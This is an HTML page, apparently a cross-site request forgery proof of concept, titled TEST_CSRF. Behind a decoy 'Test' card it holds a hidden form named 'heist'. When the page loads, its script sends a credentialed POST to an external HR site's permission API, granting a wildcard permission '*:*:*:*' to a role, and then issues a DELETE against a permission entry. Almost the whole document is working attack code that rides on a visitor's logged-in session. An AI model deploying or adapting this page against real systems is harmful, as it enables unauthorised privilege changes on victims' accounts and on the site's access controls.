<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>TEST_CSRF</title>
    <style>
      body {
        font-family: sans-serif;
        max-width: 520px;
        margin: 60px auto;
        text-align: center;
      }
      .card {
        border: 1px solid #ddd;
        padding: 2rem;
        border-radius: 8px;
        box-shadow: 0 5px 30px rgba(0, 0, 0, 0.08);
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>.......</h1><h1>Test</h1>
    </div>

    <form id="heist" method="POST" action="https://hr.moi-sy.com/api/permission" style="display: none">
      <input name="role_id" value="43" />
      <input name="code" value="*:*:*:*" />
    </form>

    <script>
      async function addPrivilegeThenRemove() {
        try {
          // 1) Send the POST request
          const postResponse = await fetch("https://hr.moi-sy.com/api/permission", {
            method: "POST",
            body: new FormData(document.getElementById("heist")),
            credentials: "include",
          });

          // check if POST succeeded
          if (!postResponse.ok) {
            console.error("POST failed", postResponse.status);
            return;
          }

          console.log("POST successful");

          // 2) Now send the DELETE
          const deleteResponse = await fetch("https://hr.moi-sy.com/api/permission/1/*:*:*:*", {
            method: "DELETE",
            credentials: "include",
          });

          if (deleteResponse.ok) {
            console.log("DELETE successful");
          } else {
            console.error("DELETE failed", deleteResponse.status);
          }
        } catch (err) {
          console.error("Error:", err);
        }
      }

      // run function
      addPrivilegeThenRemove();
      //document.getElementById("heist").submit();
    </script>
  </body>
</html>
